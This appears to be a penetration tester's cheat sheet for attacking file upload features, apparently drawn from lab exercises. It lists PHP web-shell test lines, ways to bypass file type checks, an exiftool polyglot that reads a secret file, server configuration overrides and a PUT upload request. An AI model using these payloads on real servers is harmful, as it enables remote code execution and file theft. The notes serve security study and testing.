# File Upload
**Looking for upload funtionality (obviously)**
**Make sure directory is configured to run dynamic document (PHP, JSP, ASP)**
**Can be chained with XXE Injection (XML files) / LFI (SVG / HTML / JS)**
**Make incremental checks (echo 1, echo system('ls'), echo $_get('cmd'))**

## POCs
### PHP
`<?php echo 1; ?>`
`<?php fread('<URL>', 'r'); ?>`

## Bypassing File Checks
- Check if checks are only made client side (Send through Burp)
- Servers may only generate pages using files with correct extensions
### Content Types
**SUPPLEMENTARY to MIME type
- image/[gif | jpeg | png | svg]
- application/[x-httpd-php | ]
- text/plain
### Magic Bytes
- Gif -> `GIF89a;` `GIF87a;`
- JPEG -> b`FF D8 FF`

### Obfuscating Extension
- Uppercase letters
- Alternative extensions (.php5, .shtml)
- Embedding extensions
- Multiple extensions
- Trailing whitespace/dots
- URL Encoding
- `%00` / `;` before extension
- Unicode characters

### Polyglot File
**Embedding shell with ExifTool**
```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

### Overwriting Server Configuration
#### Apache - .htaccess
```
RewriteEngine off
AddType <CONTENT-TYPE> .<EXTENSION>
```

#### IIS - web.config
```
<staticContent>
	<mimeMap fileExtension=".<EXTENSION>" mimeType="application/<MIME>"
</staticContent>
```

## Executing Code
### Non-Executable Directories
**Move up directories until you find executable directory (Web root)**

### Race Conditions
**Brute forcing random ID with large file using padding bytes**

### PUT
```
PUT /images/exploit.php HTTP/1.1
Host: <HOST>
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo 1; ?>
```

